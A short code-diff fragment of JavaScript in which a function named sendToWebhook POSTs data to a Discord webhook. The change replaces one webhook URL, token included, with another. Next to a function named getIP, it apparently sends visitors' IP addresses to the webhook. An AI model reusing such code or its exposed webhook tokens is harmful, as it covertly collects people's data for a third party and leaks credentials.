@@ -38,7 +38,7 @@ function getIP(json) {
 
 function sendToWebhook(params) {
     var request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1375139974537679030/obIOLG-9M3-_22lc62iJonHjS7q3L6DTS-_aNW84vNgNcvHgAqeKmIpBBlbeOxGBD5QQ");
+    request.open("POST", "https://discord.com/api/webhooks/1375489614206472283/i78qhceGyFtsIdZXHjsojWIZ1RId_XILPtjjtNCgh8MNAFVV1ou4StXGiEHIy_si8ZwO");
     request.setRequestHeader('Content-type', 'application/json');
 
     request.onreadystatechange = function() {
